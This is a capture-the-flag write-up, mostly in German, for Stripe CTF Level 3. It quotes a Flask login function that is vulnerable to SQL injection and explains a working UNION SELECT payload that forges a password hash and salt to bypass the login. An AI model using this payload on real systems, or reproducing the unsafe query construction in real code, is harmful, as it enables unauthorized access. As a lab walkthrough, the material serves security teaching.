LEVEL 03
========

SQL injection vulnerability

'UNION SELECT id,
"6c179f21e6f62b629055d8ab40f454ed02e48b68563913473b857d3638e23b28", " "
FROM users LIMIT 1--

----

After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.

A beta version has launched with some interesting secrets (including the password to access Level 4); you can check it out at https://level03-1.stripe-ctf.com/user-XXXX. As usual, you can fetch the code for the level (and some sample data) via git clone https://level03-1.stripe-ctf.com/user-XXXX/level03-code, or you can read the code below.

---

Bei der Anwendung aus Level03 müssen wir uns als korrekter User (in diesem Fall User *Bob*) einloggen um das korrekte Passwort zu bekommen. Hier in dem Fall haben wir keinerlei Möglichkeit an ein korrektes Passowrt für den User zu finden,... das Codestück von Interesse ist folgendes:

    @app.route('/login', methods=['POST'])
    def login():
        username = flask.request.form.get('username')
        password = flask.request.form.get('password')

        if not username:
            return "Must provide username\n"

        if not password:
            return "Must provide password\n"

        conn = sqlite3.connect(os.path.join(data_dir, 'users.db'))
        cursor = conn.cursor()

        query = """SELECT id, password_hash, salt FROM users
                   WHERE username = '{0}' LIMIT 1""".format(username)
        cursor.execute(query)

        res = cursor.fetchone()
        if not res:
            return "There's no such user {0}!\n".format(username)
        user_id, password_hash, salt = res

        calculated_hash = hashlib.sha256(password + salt)
        if calculated_hash.hexdigest() != password_hash:
            return "That's not the password for {0}!\n".format(username)

        flask.session['user_id'] = user_id
        return flask.redirect(absolute_url('/'))

Wir wir lesen können werden sowohl Username als auch Passwort aus den übergebenen Parametern genommen. Es wird weder validiert noch escaped. Hier können wir also eine SQL Injection vornehmen. Einen verfrühten Abschluß des Statements und das anhängen eines zweiten Statements (bspw. UPDATE) funktioniert hier nicht, da hier lediglich ein Statement pro execute() vorhanden sein darf. Weiter hilft hier ein UNION SELECT [Wikipedia](http://de.wikipedia.org/wiki/SQL-Injection#Aussp.C3.A4hen_von_Daten). Geben wir als Username

    'UNION SELECT id, "6c179f21e6f62b629055d8ab40f454ed02e48b68563913473b857d3638e23b28", " " FROM users LIMIT 1--

ein, so werden wir autorisiert. Wieso funktioniert das?

    user_id, password_hash, salt = res

    calculated_hash = hashlib.sha256(password + salt)
    if calculated_hash.hexdigest() != password_hash:

Hier sehen wir, wie der hash errechnet wird. Durch den UNION SELECT können wir sowohl password_hash als auch den salt überschreiben. Der salt ist hier also ein Leerzeichen, der password_hash ist 6c179f21e6f62b629055d8ab40f454ed02e48b68563913473b857d3638e23b28. Dies entspricht nämlich dem Hash zweier Leerzeichen - das eine ist der Salt, das andere das Leerzeichen, das wir als Passwort in der Eingabemaske eingeben.

    >>> hashlib.sha256(' ' + ' ').hexdigest()
    '6c179f21e6f62b629055d8ab40f454ed02e48b68563913473b857d3638e23b28'
